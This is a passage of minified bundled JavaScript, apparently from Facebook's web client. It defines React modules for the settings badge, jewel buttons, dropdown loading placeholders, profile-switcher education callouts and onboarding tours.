        j = i || (i = d("react")),
        k = i.useState;
      function a(a) {
        a = a.isActive;
        var e = d("CometRelay").useLazyLoadQuery(
            h !== void 0 ? h : (h = b("CometSettingsBadgeQuery.graphql")),
            {}
          ),
          f = k(!1),
          g = f[0];
        f = f[1];
        a && !g && f(!0);
        if (g) return null;
        f = Boolean(
          e == null
            ? void 0
            : (a = e.viewer) == null
            ? void 0
            : a.device_switchable_account_has_notification
        );
        return f === !1
          ? null
          : j.jsx(c("CometBadge.react"), {
              border: "white",
              color: "red",
              isProfileBadge: !0,
              size: 10,
            });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "PredictionThresholds",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      a = 10;
      b = 1;
      f.MAX_JEWEL_BADGE = a;
      f.MIN_JEWEL_BADGE = b;
    },
    66
  );
  __d(
    "CometSettingsBadgeWrapper.react",
    [
      "BaseView.react",
      "CometErrorBoundary.react",
      "CometPlaceholder.react",
      "CometPressable.react",
      "PredictionThresholds",
      "killswitch",
      "react",
      "useIsDsaNotifications",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useRef,
        l = {
          badgeContainer: { position: "x10l6tqk", zIndex: "x1vjfegm", $$css: !0 },
        };
      function a(a) {
        var b = a.badgeXStyle,
          e = a.children,
          f = a.deferredBadgeCount,
          g = a.label,
          h = a.onBadgeCount;
        a.onFocusIn;
        a.onFocusOut;
        var m = a.onHighIntentPrerenderer,
          n = a.onHoverIn,
          o = a.onHoverOut,
          p = a.onPress,
          q = a.onPressIn;
        a.onPressOut;
        var r = a.tracePolicy;
        a = f;
        var s = k(null),
          t = c("useIsDsaNotifications")(),
          u = j(
            function (a) {
              h && h(a);
              if (s.current === a) return;
              s.current = a;
              a >= d("PredictionThresholds").MIN_JEWEL_BADGE &&
              a <= d("PredictionThresholds").MAX_JEWEL_BADGE &&
              ((r === "comet.jewel.messenger" &&
                !c("killswitch")("COMET_PRERENDER_MESSENGER")) ||
                (r === "comet.jewel.notification" && !t))
                ? m(!0)
                : m(!1);
            },
            [h, m, r]
          );
        return i.jsxs(c("BaseView.react"), {
          children: [
            e,
            f != null &&
              i.jsx(c("CometErrorBoundary.react"), {
                children: i.jsx(c("CometPlaceholder.react"), {
                  fallback: i.jsx("span", {}),
                  children: i.jsx(c("CometPressable.react"), {
                    "aria-hidden": !0,
                    focusable: !1,
                    hideHoverOverlay: !0,
                    label: g,
                    onHoverIn: n,
                    onHoverOut: o,
                    onPress: p,
                    onPressIn: q,
                    overlayRadius: "50%",
                    xstyle: [l.badgeContainer, b],
                    children: i.jsx(a, { overflow: 20, setBadgeCount: u }),
                  }),
                }),
              }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSettingsJewelButton.react",
    [
      "CometCircleButton.react",
      "CometPressableOverlay.react",
      "TetraIcon.react",
      "mergeRefs",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useMemo,
        k = {
          iconDisabled: {
            alignItems: "x6s0dn4",
            backgroundColor: "x1hr4nm9",
            borderTopStartRadius: "x14yjl9h",
            borderTopEndRadius: "xudhj91",
            borderBottomEndRadius: "x18nykt9",
            borderBottomStartRadius: "xww2gxu",
            display: "x78zum5",
            height: "x1vqgdyp",
            justifyContent: "xl56j7k",
            width: "x100vrsf",
            $$css: !0,
          },
          pressableOverlayPressed: { backgroundColor: "x1iutvsz", $$css: !0 },
        },
        l = { color: "primary", iconType: "normal" },
        m = { color: "highlight", iconType: "deemphasized-overlay" };
      function a(a, b) {
        var d = a.disabled,
          e = a.isSelected,
          f = a.linkProps,
          g = a.loggingRef,
          h = babelHelpers.objectWithoutPropertiesLoose(a, [
            "disabled",
            "isSelected",
            "linkProps",
            "loggingRef",
          ]),
          n = j(
            function () {
              return c("mergeRefs")(b, g);
            },
            [b, g]
          );
        return d === !0
          ? i.jsxs("div", {
              className:
                "x6s0dn4 x1hr4nm9 x14yjl9h xudhj91 x18nykt9 xww2gxu x78zum5 x1vqgdyp xl56j7k x100vrsf",
              children: [
                i.jsx(c("TetraIcon.react"), {
                  color: "highlight",
                  icon: a.icon,
                  size: 20,
                }),
                i.jsx(c("CometPressableOverlay.react"), {
                  pressedStyle: k.pressableOverlayPressed,
                  radius: "50%",
                }),
              ],
            })
          : i.jsx(
              c("CometCircleButton.react"),
              babelHelpers["extends"]({}, h, {
                color: e ? m.color : l.color,
                linkProps: f,
                ref: n,
                size: 40,
                type: e ? m.iconType : l.iconType,
              })
            );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      b = i.forwardRef(a);
      g["default"] = b;
    },
    98
  );
  __d(
    "CometSettingsListDropdownLoadingState.react",
    [
      "CometListCellGlimmer.react",
      "CometPopover.react",
      "TetraText.react",
      "qex",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react"),
        k = c("qex")._("999"),
        l = {
          actions: { height: "x17rw0jw", width: "xvy4d1p", $$css: !0 },
          card: { width: "x1cvmir6", $$css: !0 },
          cardFullHeight: { height: "x20eyyc", maxWidth: "xvv7f4i", $$css: !0 },
          heading: {
            alignItems: "x6s0dn4",
            display: "x78zum5",
            flexShrink: "x2lah0s",
            justifyContent: "x1qughib",
            minHeight: "x21xpn4",
            paddingTop: "xz9dl7a",
            paddingEnd: "x1pi30zi",
            paddingBottom: "xjkvuk6",
            paddingStart: "x1swvt13",
            $$css: !0,
          },
          root: {
            marginEnd: "x1emribx",
            marginLeft: null,
            marginRight: null,
            marginTop: "x1ok221b",
            $$css: !0,
          },
        };
      function m(a) {
        var b = a.glimmerSize;
        b = b === void 0 ? 56 : b;
        var d = a.hasActions;
        d = d === void 0 ? !1 : d;
        var e = a.numberOfItems,
          f = a.shouldAnimate;
        a = a.title;
        return f !== !1 && k === !0
          ? j.jsx(m.WithoutPopover, {
              glimmerSize: b,
              hasActions: d,
              numberOfItems: e,
              title: a,
            })
          : j.jsx("div", {
              className: "x1emribx x1ok221b",
              children: j.jsx(c("CometPopover.react"), {
                children: j.jsx(m.WithoutPopover, {
                  glimmerSize: b,
                  hasActions: d,
                  numberOfItems: e,
                  title: a,
                }),
              }),
            });
      }
      m.displayName = m.name + " [from " + f.id + "]";
      var n = 76;
      m.InnerGlimmer = function (a) {
        var b = a.numberOfItems;
        a = a.size;
        a = a === void 0 ? 56 : a;
        return j.jsx(c("CometListCellGlimmer.react"), {
          imageSize: a,
          imageStyle: "circle",
          numberOfItems:
            b != null
              ? b
              : Math.max(Math.ceil((window.innerHeight - 72 - 45) / n), 1),
        });
      };
      m.WithoutPopover = function (a) {
        var b = a.glimmerSize;
        b = b === void 0 ? 56 : b;
        var d = a.hasActions;
        d = d === void 0 ? !1 : d;
        var e = a.numberOfItems;
        a = a.title;
        return j.jsxs("div", {
          className: (h || (h = c("stylex")))(
            l.card,
            e == null && l.cardFullHeight
          ),
          children: [
            j.jsxs("div", {
              className: h([l.heading]),
              children: [
                j.jsx(c("TetraText.react"), {
                  isSemanticHeading: !0,
                  type: "headlineEmphasized1",
                  children: a,
                }),
                d && j.jsx("div", { className: "x17rw0jw xvy4d1p" }),
              ],
            }),
            j.jsx(m.InnerGlimmer, { numberOfItems: e, size: b }),
          ],
        });
      };
      g["default"] = m;
    },
    98
  );
  __d(
    "CometSettingsBadgedDropdownTrigger.react",
    [
      "CometSettingsBadgeWrapper.react",
      "CometSettingsJewelButton.react",
      "CometSettingsListDropdownLoadingState.react",
      "CometTooltip.react",
      "MWJewelPopoverDialogContext.react",
      "cr:1875562",
      "cr:1875563",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext,
        k = {
          badgeOffset: {
            start: "x8zc4e7",
            left: null,
            right: null,
            top: "xtu2xtp",
            $$css: !0,
          },
        },
        l = Object.freeze({});
      function a(a) {
        var d,
          e = a.dropdownPosition,
          f = e === void 0 ? "below" : e;
        e = a.fallback;
        var g = a.forceActive,
          h = g === void 0 ? !1 : g,
          m = a.tracePolicy;
        g = j(c("MWJewelPopoverDialogContext.react"));
        var n = g.setIsOpenForDialog,
          o = function (b, d, e, g, j, l, o, p) {
            return i.jsx(c("CometTooltip.react"), {
              position: f,
              tooltip: a.tooltipLabel,
              children: i.jsx("span", {
                ref: b,
                children: i.jsx(c("CometSettingsBadgeWrapper.react"), {
                  badgeXStyle: k.badgeOffset,
                  deferredBadgeCount: a.deferredBadgeCount,
                  label: a.label,
                  onBadgeCount: a.onBadgeCount,
                  onHighIntentPrerenderer: o,
                  onHoverIn: function (b) {
                    g && g(b),
                      a.onHoverInPrerenderer && a.onHoverInPrerenderer(b);
                  },
                  onHoverOut: j,
                  onPress: function (b) {
                    !h && !(b.ctrlKey || b.metaKey) && d && d(b),
                      a.onPress && a.onPress(b);
                  },
                  onPressIn: function (b) {
                    l && l(b),
                      a.onPressInPrerenderer && a.onPressInPrerenderer(b);
                  },
                  tracePolicy: m,
                  children: i.jsx(c("CometSettingsJewelButton.react"), {
                    disabled: a.disabled,
                    icon: a.icon,
                    isSelected: p || h,
                    label: a.label,
                    linkProps: a.linkProps,
                    loggingRef: a.loggingRef,
                    onHoverIn: function (b) {
                      g && g(b),
                        a.onHoverInPrerenderer && a.onHoverInPrerenderer(b);
                    },
                    onHoverOut: j,
                    onPress: function (b) {
                      !h && !(b.ctrlKey || b.metaKey) && d && d(b),
                        a.onPress && a.onPress(b),
                        n(!1);
                    },
                    onPressIn: function (b) {
                      l && l(b),
                        a.onPressInPrerenderer && a.onPressInPrerenderer(b);
                    },
                    testid: void 0,
                  }),
                }),
              }),
            });
          };
        g = a.dropdownEntryPoint;
        g = g === void 0 ? null : g;
        var p = a.dropdownResource;
        p = p === void 0 ? null : p;
        e = {
          align: "start",
          doNotCloseOnOutsideClick:
            (d = a == null ? void 0 : a.doNotCloseOnOutsideClick) != null
              ? d
              : !1,
          fallback:
            (d = e) != null
              ? d
              : i.jsx(c("CometSettingsListDropdownLoadingState.react"), {
                  title: a.label,
                }),
          position: f,
          tracePolicy: m,
        };
        if (g != null) {
          return i.jsx(
            b("cr:1875563"),
            babelHelpers["extends"]({}, e, {
              entryPointParams: l,
              otherProps: l,
              popoverEntryPoint: g,
              preloadTrigger: (d = a.preloadTrigger) != null ? d : "button",
              children: function () {
                return o.apply(void 0, arguments);
              },
            })
          );
        } else if (p != null) {
          return i.jsx(
            b("cr:1875562"),
            babelHelpers["extends"]({}, e, {
              popoverProps: l,
              popoverResource: p,
              preloadTrigger: (g = a.preloadTrigger) != null ? g : "button",
              children: function () {
                return o.apply(void 0, arguments);
              },
            })
          );
        }
        return null;
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSettingsDropdownPopoverTrigger.entrypoint",
    ["JSResourceForInteraction"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = {
        getPreloadProps: function () {
          return { queries: {} };
        },
        root: c("JSResourceForInteraction")(
          "CometSettingsDropdownRoot.react"
        ).__setRef("CometSettingsDropdownPopoverTrigger.entrypoint"),
      };
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSetProfileSwitcherEducationContext",
    ["react", "recoverableViolation"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext({
        resetSwitcherEducationState: function () {
          c("recoverableViolation")(
            "No provider of CometSetProfileSwitcherContext exists",
            "comet_ui"
          );
        },
        setCalloutText: function (a) {
          c("recoverableViolation")(
            "No provider of CometSetProfileSwitcherContext exists",
            "comet_ui"
          );
        },
        setShowCallout: function (a) {
          c("recoverableViolation")(
            "No provider of CometSetProfileSwitcherContext exists",
            "comet_ui"
          );
        },
      });
      g["default"] = b;
    },
    98
  );
  __d(
    "CometSettingsDropdownLoadingState.react",
    [
      "CometCard.react",
      "CometDivider.react",
      "CometListCellGlimmer.react",
      "CometPopover.react",
      "qex",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = c("qex")._("999"),
        k = {
          card: { width: "x1cvmir6", $$css: !0 },
          cardLegacy: {
            paddingTop: "x1y1aw1k",
            paddingEnd: "x4uap5",
            paddingBottom: "xwib8y2",
            paddingStart: "xkhd6sd",
            width: "x1cvmir6",
            $$css: !0,
          },
          divider: {
            marginTop: "xdj266r",
            marginEnd: "xktsk01",
            marginBottom: "xat24cr",
            marginStart: "x1d52u69",
            $$css: !0,
          },
          headerCardStyle: {
            marginTop: "x14vqqas",
            marginEnd: "xktsk01",
            marginBottom: "x1yztbdb",
            marginStart: "x1d52u69",
            $$css: !0,
          },
          headerCellPrimary: {
            marginTop: "xw7yly9",
            marginEnd: "xq8finb",
            marginBottom: "x1e56ztr",
            marginStart: "x16n37ib",
            $$css: !0,
          },
          headerCellSecondary: {
            marginTop: "xw7yly9",
            marginEnd: "xq8finb",
            marginBottom: "xod5an3",
            marginStart: "x16n37ib",
            $$css: !0,
          },
          listFooter: {
            marginTop: "x1xmf6yo",
            marginEnd: "x11i5rnm",
            marginBottom: "x1e56ztr",
            marginStart: "x1mh8g0r",
            $$css: !0,
          },
          root: { marginTop: "x1ok221b", $$css: !0 },
        };
      function l(a) {
        var b = a.iconSize;
        b = b === void 0 ? "large" : b;
        a = a.shouldShowSimpleDropdownHeader;
        a = a === void 0 ? !1 : a;
        return j === !0
          ? i.jsx(l.WithoutPopover, {
              iconSize: b,
              shouldShowSimpleDropdownHeader: a,
            })
          : i.jsx("div", {
              className: "x1ok221b",
              children: i.jsx(c("CometPopover.react"), {
                children: i.jsx(l.WithoutPopover, {
                  iconSize: b,
                  shouldShowSimpleDropdownHeader: a,
                }),
              }),
            });
      }
      l.displayName = l.name + " [from " + f.id + "]";
      l.WithoutPopover = function (a) {
        var b = a.iconSize;
        a = a.shouldShowSimpleDropdownHeader;
        return a === !0
          ? i.jsxs("div", {
              className: "x1cvmir6",
              children: [
                i.jsx("div", {
                  className: "x14vqqas xktsk01 x1yztbdb x1d52u69",
                  children: i.jsxs(c("CometCard.react"), {
                    dropShadow: 2,
                    children: [
                      i.jsx("div", {
                        className: "xw7yly9 xq8finb x1e56ztr x16n37ib",
                        children: i.jsx(c("CometListCellGlimmer.react"), {
                          imageSize: 36,
                          imageStyle: "circle",
                          numberOfItems: 1,
                          paddingHorizontal: 0,
                        }),
                      }),
                      i.jsx(c("CometDivider.react"), { xstyle: k.divider }),
                      i.jsx("div", {
                        className: "xw7yly9 xq8finb xod5an3 x16n37ib",
                        children: i.jsx(c("CometListCellGlimmer.react"), {
                          numberOfItems: 1,
                          paddingHorizontal: 0,
                        }),
                      }),
                    ],
                  }),
                }),
                i.jsx(c("CometListCellGlimmer.react"), {
                  imageSize: 36,
                  imageStyle: "circle",
                  numberOfItems: 5,
                  removeFirstItemPadding: !1,
                }),
                i.jsx("div", {
                  className: "x1xmf6yo x11i5rnm x1e56ztr x1mh8g0r",
                  children: i.jsx(c("CometListCellGlimmer.react"), {
                    numberOfItems: 1,
                    removeFirstItemPadding: !1,
                  }),
                }),
              ],
            })
          : i.jsxs("div", {
              className: "x1y1aw1k x4uap5 xwib8y2 xkhd6sd x1cvmir6",
              children: [
                i.jsx(c("CometListCellGlimmer.react"), {
                  imageSize: b === "large" ? 60 : 36,
                  imageStyle: "circle",
                  numberOfItems: b === "large" ? 1 : 2,
                }),
                i.jsx(c("CometListCellGlimmer.react"), {
                  imageSize: 36,
                  imageStyle: "circle",
                  numberOfItems: 6,
                }),
              ],
            });
      };
      g["default"] = l;
    },
    98
  );
  __d(
    "CometSettingsDropdownPopoverTrigger.react",
    [
      "CometSetProfileSwitcherEducationContext",
      "CometSettingsDropdownLoadingState.react",
      "CometSettingsDropdownPopoverTrigger.entrypoint",
      "cr:1875563",
      "gkx",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext;
      function a(a) {
        var d = a.children,
          e = a.dropdownPosition;
        e = e === void 0 ? "below" : e;
        var f = a.iconSize,
          g = a.onVisibilityChange;
        a = a.tracePolicy;
        var h = j(c("CometSetProfileSwitcherEducationContext")),
          k = h.resetSwitcherEducationState;
        h = c("gkx")("1266082");
        return i.jsx(b("cr:1875563"), {
          align: "end",
          entryPointParams: {},
          fallback: i.jsx(c("CometSettingsDropdownLoadingState.react"), {
            iconSize: f,
            shouldShowSimpleDropdownHeader: h,
          }),
          onVisibilityChange: function (a) {
            a || k(), g == null ? void 0 : g(a);
          },
          otherProps: {},
          popoverEntryPoint: c("CometSettingsDropdownPopoverTrigger.entrypoint"),
          position: e,
          preloadTrigger: "button",
          tracePolicy: a,
          children: d,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "ActorTypes$FbtEnum",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      a = { PAGE: "Page", PROFILE: "Profile" };
      b = a;
      f["default"] = b;
    },
    66
  );
  __d(
    "ActorTypesKeys",
    ["$InternalEnum"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = b("$InternalEnum").Mirrored(["PAGE", "PROFILE"]);
      c = a;
      f["default"] = c;
    },
    66
  );
  __d(
    "TriangleDownFilled20IconSvg.react",
    ["SVGIcon", "TriangleDownFilled20.svg.react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = d("SVGIcon").svgIcon(c("TriangleDownFilled20.svg.react"));
      g["default"] = a;
    },
    98
  );
  __d(
    "CometProfileSwitcherDefaults",
    ["fbt"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      a = h._("__JHASH__MkdQRzKLi_X__JHASH__");
      g.DEFAULT_CALLOUT_TEXT = a;
    },
    98
  );
  __d(
    "CometProfileSwitcherEducationContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext({ calloutText: null, showCallout: !1 });
      g["default"] = b;
    },
    98
  );
  __d(
    "useCometProfileChangeCallout",
    [
      "CometProfileSwitcherDefaults",
      "CometProfileSwitcherEducationContext",
      "react",
      "useCometCallout",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometProfileSwitcherEducationContext")),
          b = a.calloutText;
        a = a.showCallout;
        b = {
          arrowStyle: "inset",
          label:
            (b = b == null ? void 0 : b.current) != null
              ? b
              : d("CometProfileSwitcherDefaults").DEFAULT_CALLOUT_TEXT,
          position: "below",
          type: "accent",
        };
        return c("useCometCallout")(b, a);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometPromptProfileSwitcherEducation",
    [
      "CometProfileSwitcherDefaults",
      "CometSetProfileSwitcherEducationContext",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometSetProfileSwitcherEducationContext")),
          b = a.setCalloutText,
          e = a.setShowCallout;
        return {
          hideCallout: function () {
            e(!1);
          },
          showCallout: function (a, c) {
            a != null
              ? b(a)
              : b(d("CometProfileSwitcherDefaults").DEFAULT_CALLOUT_TEXT),
              e(!0, c);
          },
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometSettingsDropdownTriggerNUXTours.react",
    ["fbt", "TetraText.react", "mergeRefs", "react", "useCometNUXTourTarget"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || (i = d("react")),
        k = i.useMemo;
      function a(a) {
        a = a.profileName;
        var b = c("useCometNUXTourTarget")({
            contextualLayerOptions: { align: "end" },
            description: h._("__JHASH__adpchqSElpB__JHASH__", [
              h._implicitParam(
                "=m2",
                j.jsx("span", {
                  className: "x117nqv4",
                  children: h._("__JHASH__6nU8PJIgIXh__JHASH__", [
                    h._param("profile_name", a),
                  ]),
                })
              ),
            ]),
            targetKey: "PROFILE_SWITCHER",
            title: h._("__JHASH__BcWMVR1zakO__JHASH__"),
          }),
          d = c("useCometNUXTourTarget")({
            contextualLayerOptions: { align: "end" },
            description: h._("__JHASH__GprgjOkuiY7__JHASH__", [
              h._implicitParam(
                "=m2",
                j.jsx("span", {
                  className: "x117nqv4",
                  children: h._("__JHASH__Oscpx2DKdIX__JHASH__", [
                    h._param("profile_name", a),
                  ]),
                })
              ),
            ]),
            targetKey: "COMMUNITY_SWITCHER",
            title: h._("__JHASH__YVhv4CcDo-Y__JHASH__"),
          }),
          e = c("useCometNUXTourTarget")({
            contextualLayerOptions: { align: "end" },
            description: h._("__JHASH__ykxvK5izgOf__JHASH__", [
              h._param(
                "page_name",
                j.jsx(c("TetraText.react"), { type: "bodyLink2", children: a })
              ),
            ]),
            targetKey: "PROFILE_SWITCH_SETTINGS_STEP",
            title: h._("__JHASH__7ePPSYXQEXI__JHASH__"),
          });
        return k(
          function () {
            return c("mergeRefs")(b, d, e);
          },
          [b, d, e]
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useEndCometNUXTour",
    [
      "CometNUXTourConsumerContext",
      "emptyFunction",
      "react",
      "recoverableViolation",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometNUXTourConsumerContext"));
        if (a == null) {
          c("recoverableViolation")(
            "Unable to retrieve nux tour context",
            "comet_ui"
          );
          return c("emptyFunction");
        }
        a = a.endTour;
        return a;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useFXUserData",
    ["Actor", "CurrentUser"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = d("Actor").useActor();
        a = a[0];
        return { accountId: c("CurrentUser").getAccountID(), actorId: a };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useFXSwitcherSwitchedSuccessLogger",
    ["requireDeferred", "useFXUserData"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("SwitchedSuccessFalcoEvent").__setRef(
        "useFXSwitcherSwitchedSuccessLogger"
      );
      function a() {
        var a = c("useFXUserData")(),
          b = a.accountId,
          d = a.actorId;
        return function (a) {
          h.onReady(function (c) {
            c.log(function () {
              return babelHelpers["extends"](
                {
                  entry_point: "settings",
                  is_cds: !0,
                  target_account_id: b,
                  target_identity_id: d,
                },
                a
              );
            });
          });
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useProfileCometSOAPWelcomeDialog",
    [
      "CometNUXManagerContext",
      "JSResourceForInteraction",
      "gkx",
      "react",
      "useCometLazyDialog",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext,
        j = "9388",
        k = c("JSResourceForInteraction")(
          "ProfileCometSOAPOnboardingDialog.react"
        ).__setRef("useProfileCometSOAPWelcomeDialog");
      function a() {
        var a = c("useCometLazyDialog")(k),
          b = a[0];
        a = i(c("CometNUXManagerContext"));
        var d = a.registerNUX,
          e = c("gkx")("2528");
        return function (a) {
          e &&
            d(j, function (c) {
              c && b({ onExit: a });
            });
        };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSettingsDropdownTrigger.react",
    [
      "fbt",
      "ActorTypes$FbtEnum",
      "ActorTypesKeys",
      "BaseToasterStateManager",
      "ChevronDownFilled16IconSvg.react",
      "CometCircleButton.react",
      "CometContextualLayerAnchorRoot.react",
      "CometIcon.react",
      "CometProfilePhoto.react",
      "CometProfilePlusAdminEducationStrings",
      "CometRelay",
      "CometRouteParams",
      "CometSettingsDropdownTriggerQuery.graphql",
      "CometSwitcherGating",
      "TetraProfilePhoto.react",
      "TetraText.react",
      "TriangleDownFilled20IconSvg.react",
      "UserCategoryWithAdminsOrLimitedAccessRoles",
      "WebStorage",
      "cometPushToast",
      "cr:3923",
      "getJSEnumSafe",
      "mergeRefs",
      "previousProfileIdForToastSessionStorage",
      "promiseDone",
      "qex",
      "react",
      "useCometCallout",
      "useCometCalloutNUX",
      "useCometProfileChangeCallout",
      "useCometPromptProfileSwitcherEducation",
      "useCometPulseNUX",
      "useCometSettingsDropdownTriggerNUXTours.react",
      "useEndCometNUXTour",
      "useFXSwitcherSwitchedSuccessLogger",
      "useProfileCometSOAPWelcomeDialog",
      "useTopMostRouteCometEntityKey",
      "useTopNavigationLogging",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k,
        l = k || (k = d("react"));
      e = k;
      var m = e.useCallback,
        n = e.useEffect,
        o = e.useMemo,
        p = e.useState,
        q = {
          personalProfilePageAdminSwitcherTooltip: {
            maxWidth: "xw5ewwj",
            $$css: !0,
          },
          profileName: { fontWeight: "x117nqv4", $$css: !0 },
          tooltip: { maxWidth: "x256u9z", $$css: !0 },
        },
        r = {
          align: "end",
          arrowStyle: "edge",
          position: "below",
          type: "accent",
          xstyle: q.tooltip,
        },
        s = h._("__JHASH__h1XR_i3Axas__JHASH__"),
        t = "8150",
        u = "8191",
        v = "8189",
        w = "9348",
        aa =
          i !== void 0 ? i : (i = b("CometSettingsDropdownTriggerQuery.graphql")),
        ba = h._("__JHASH__jN3j1k2S9o6__JHASH__"),
        ca = h._("__JHASH__fHYmTaH3nh-__JHASH__"),
        da = h._("__JHASH__ye5j_4B7uia__JHASH__");
      function a(a, e) {
        var f = a.onHoverIn,
          g = a.onHoverOut,
          i = a.onPress,
          k = a.onPressIn,
          x = a.profilePictureUri,
          y = a.size,
          z = a.testid;
        z = a.type;
        var A = d("CometRelay").useRelayEnvironment();
        a = p("");
        var B = a[0],
          ea = a[1];
        a = p(c("ActorTypesKeys").PROFILE);
        var C = a[0],
          fa = a[1];
        a = p(!1);
        var D = a[0],
          E = a[1];
        a = p(!1);
        var F = a[0],
          G = a[1];
        a = p(!1);
        var H = a[0],
          I = a[1];
        a = p(!1);
        var J = a[0],
          K = a[1];
        a = p(!1);
        var L = a[0],
          M = a[1];
        a = p(!1);
        var N = a[0],
          O = a[1];
        a = p(!1);
        var ga = a[0],
          ha = a[1];
        a = p(!1);
        var P = a[0],
          ia = a[1];
        n(
          function () {
            if (P) return;
            var a = function () {
              P || ha(!0);
            };
            window.addEventListener(
              d("CometProfilePlusAdminEducationStrings")
                .PROFILE_PLUS_EDUCATION_CLOSED_PROFILE_SWITCHER_EVENT_NAME,
              a
            );
            return function () {
              window.removeEventListener(
                d("CometProfilePlusAdminEducationStrings")
                  .PROFILE_PLUS_EDUCATION_CLOSED_PROFILE_SWITCHER_EVENT_NAME,
                a
              );
            };
          },
          [P]
        );
        a = c("useTopMostRouteCometEntityKey")();
        var Q =
          (a == null ? void 0 : a.entity_type) === "profile" &&
          (a == null ? void 0 : a.section) === "timeline";
        a =
          (a == null ? void 0 : a.entity_type) === "pages" &&
          ((a == null ? void 0 : a.section) === "your_pages" ||
            (a == null ? void 0 : a.section) === "your_pages_original");
        var R = d("CometRouteParams").useRouteParams();
        R =
          (R == null ? void 0 : R.show_switched_tooltip) != null &&
          ((R == null ? void 0 : R.show_switched_tooltip) === 1 ||
            (R == null ? void 0 : R.show_switched_tooltip) === "1" ||
            (R == null ? void 0 : R.show_switched_tooltip) === !0 ||
            (R == null ? void 0 : R.show_switched_tooltip) === "true");
        n(
          function () {
            c("promiseDone")(
              d("CometRelay")
                .fetchQuery(A, aa, {
                  coreAppAdminProfileSwitcherNuxId: +v,
                  pageManagementNuxId: +u,
                  profileSwitcherAdminEducationNuxId: +w,
                  profileSwitcherNuxId: +t,
                  showNewToast: !0,
                })
                .toPromise()
                .then(function (a) {
                  var b, d, e, f, g, h;
                  b =
                    (a == null
                      ? void 0
                      : (b = a.viewer) == null
                      ? void 0
                      : (b = b.actor) == null
                      ? void 0
                      : (b = b.profile_switcher_eligible_profiles) == null
                      ? void 0
                      : b.count) || 0;
                  d =
                    (a == null
                      ? void 0
                      : (d = a.page_management_nux) == null
                      ? void 0
                      : d.should_show) === !0 && b > 0;
                  e =
                    (a == null
                      ? void 0
                      : (e = a.profile_switcher_nux) == null
                      ? void 0
                      : e.should_show) === !0 && b > 0;
                  f = c("getJSEnumSafe")(
                    c("UserCategoryWithAdminsOrLimitedAccessRoles"),
                    a == null
                      ? void 0
                      : (f = a.viewer) == null
                      ? void 0
                      : (f = f.actor) == null
                      ? void 0
                      : f.user_category_with_admins_or_limited_access_roles
                  );
                  g =
                    (a == null
                      ? void 0
                      : (g = a.core_app_admin_profile_switcher_nux) == null
                      ? void 0
                      : g.should_show) === !0 &&
                    f === "can_have_admin_and_limited_access_roles";
                  f =
                    (a == null
                      ? void 0
                      : (f = a.profile_switcher_admin_education_nux) == null
                      ? void 0
                      : f.should_show) === !0 && b > 0;
                  b =
                    (a == null
                      ? void 0
                      : (b = a.viewer) == null
                      ? void 0
                      : (b = b.actor) == null
                      ? void 0
                      : b.should_show_soap_onboarding_dialog) === !0;
                  ea(
                    (h =
                      a == null
                        ? void 0
                        : (h = a.viewer) == null
                        ? void 0
                        : (h = h.actor) == null
                        ? void 0
                        : h.name) != null
                      ? h
                      : ""
                  );
                  fa(
                    (a == null
                      ? void 0
                      : (h = a.viewer) == null
                      ? void 0
                      : (h = h.actor) == null
                      ? void 0
                      : h.is_additional_profile_plus) === !0
                      ? c("ActorTypesKeys").PAGE
                      : c("ActorTypesKeys").PROFILE
                  );
                  E(e);
                  G(d);
                  I(g);
                  K(f);
                  M(b);
                  ja(a);
                })
            );
          },
          [Q, A, R]
        );
        var S = c("useProfileCometSOAPWelcomeDialog")();
        n(
          function () {
            L &&
              S(function () {
                O(!0), M(!1);
              });
          },
          [B, L, S]
